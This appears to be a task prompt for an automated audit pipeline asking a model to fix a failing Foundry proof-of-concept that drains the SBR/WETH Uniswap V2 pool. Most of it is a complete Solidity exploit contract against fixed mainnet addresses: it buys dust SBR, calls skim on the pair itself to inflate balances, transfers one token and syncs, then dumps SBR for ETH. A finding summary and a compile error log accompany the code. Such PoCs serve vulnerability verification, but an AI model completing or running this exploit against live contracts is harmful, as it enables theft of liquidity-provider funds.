You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pair self-transfer via `skim(pair)` appears to inflate SBR balances and enables AMM liquidity theft
- claim: The provided exploit harness shows an attacker can buy only a dust amount of SBR, call `UniswapV2Pair.skim(UniswapV2Pair)`, then observe a very large SBR balance before selling it back through the pool. This supports a token-accounting flaw in SBR that is triggered by the pair transferring tokens to itself during `skim(pair)`, causing balances to be created or duplicated at negligible cost. The subsequent `transfer(..., 1)` and `sync()` steps let the attacker align pool reserves with the manipulated token balance and realize the fabricated balance against the paired asset.
- impact: An external attacker can manufacture a large sellable SBR position from negligible capital and dump it into the SBR/WETH pool, draining most or all of the paired ETH liquidity, collapsing the market, and inflicting direct loss on LPs and traders.
- exploit_paths: ["Swap a dust amount of ETH for SBR", "Call `UniswapV2Pair.skim(UniswapV2Pair)` so the pair performs a self-transfer", "Leverage the resulting inflated SBR balance held by the attacker", "Transfer a dust token amount to the pair and call `sync()` to update reserves", "Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
}

interface IWETH is IERC20 {
    function withdraw(uint256 amount) external;
}

contract FlawVerifier {
    address internal constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V2_PAIR = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;

    uint256 internal constant DUST_ETH_IN = 4_000;

    address internal lastProfitToken;
    uint256 internal lastProfitAmount;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;
        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        if (nativeBefore < DUST_ETH_IN) {
            uint256 missingNative = DUST_ETH_IN - nativeBefore;
            require(wethBefore >= missingNative, "insufficient pre-funded capital");

            // Funding with verifier-held WETH only changes how the dust buy is sourced.
            // The exploit causality remains the same as the reported path.
            IWETH(WETH).withdraw(missingNative);
            nativeBefore = address(this).balance;
        }

        _executeExploitPath(DUST_ETH_IN);

        uint256 nativeAfter = address(this).balance;
        lastProfitAmount = nativeAfter > nativeBefore ? nativeAfter - nativeBefore : 0;

        // Keep realized proceeds in ETH because the final exploit step drains paired ETH
        // from the pool. `address(0)` signals native-profit accounting to the harness.
        lastProfitToken = address(0);
        require(lastProfitAmount > 0, "no net profit");
    }

    function profitToken() external view returns (address) {
        return lastProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return lastProfitAmount;
    }

    function _executeExploitPath(uint256 ethToSpend) internal {
        uint256 deadline = block.timestamp + 300;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = SBR;

        // exploit_paths[0]: Swap a dust amount of ETH for SBR.
        uint256 sbrBeforeBuy = IERC20(SBR).balanceOf(address(this));
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethToSpend}(
            0,
            path,
            address(this),
            deadline
        );

        // exploit_paths[1]: Call skim(pair) so the pair self-transfers.
        IUniswapV2Pair(UNISWAP_V2_PAIR).skim(UNISWAP_V2_PAIR);

        // exploit_paths[2]: The token-accounting flaw should now leave the attacker with
        // an abnormally large sellable SBR balance after the pair self-transfer.
        uint256 sbrAfterSkim = IERC20(SBR).balanceOf(address(this));
        require(sbrAfterSkim > sbrBeforeBuy, "skim self-transfer did not inflate attacker balance");

        // exploit_paths[3]: Transfer a dust amount back to the pair and sync reserves so
        // the AMM pricing reflects the manipulated token balance before dumping.
        _safeTransfer(SBR, UNISWAP_V2_PAIR, 1);
        IUniswapV2Pair(UNISWAP_V2_PAIR).sync();

        uint256 sellAmount = IERC20(SBR).balanceOf(address(this));
        require(sellAmount > 1, "no manipulated SBR left to dump");

        _forceApprove(SBR, UNISWAP_V2_ROUTER, type(uint256).max);

        path[0] = SBR;
        path[1] = WETH;

        // exploit_paths[4]: Swap the inflated SBR balance back through the pool and drain ETH.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            address(this),
            deadline
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount))) {
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _requireOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _requireOptionalReturn(address token, bytes memory data) internal {
        require(_callOptionalReturn(token, data), "token call failed");
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        if (!success) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length == 32) {
            return abi.decode(returndata, (bool));
        }
        return false;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
